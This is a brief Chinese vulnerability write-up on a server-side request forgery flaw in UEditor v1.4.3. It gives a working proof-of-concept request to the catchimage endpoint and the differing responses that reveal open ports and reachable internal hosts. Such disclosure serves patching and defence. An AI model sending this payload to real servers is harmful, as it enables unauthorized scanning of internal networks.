# Ueditor ssrf漏洞

## 漏洞影响：

v1.4.3

## 漏洞POC

存在漏洞路径：

http://localhost:8088/jsp/controller.jsp?action=catchimage&source[]=http://192.168.135.133:8080/test.jpg

可根据页面返回的结果不同判断该地址端口是否开放：

1. 如果抓取不存在的图片地址时，页面返回{"state": "SUCCESS", list: [{"state":"\u8fdc\u7a0b\u8fde\u63a5\u51fa\u9519"} ]}，即state为“远程连接出错”。
2. 如果成功抓取到图片，页面返回{"state": "SUCCESS",  list: [{"state":  "SUCCESS","size":"5103","source":"http://192.168.135.133:8080/tomcat.png","title":"1527173588127099881.png","url":"/ueditor/jsp/upload/image/20180524/1527173588127099881.png"} ]}，即state为“SUCCESS”。
3. 如果主机无法访问，页面返回{"state":"SUCCESS", list: [{"state": "\u6293\u53d6\u8fdc\u7a0b\u56fe\u7247\u5931\u8d25"}]}，即state为“抓取远程图片失败”。

由于除了在config.js中的catcherLocalDomain配置了过滤的地址外，没有针对内部地址进行过滤，所以可以根据抓取远程图片返回结果的不同，来进行内网的探测。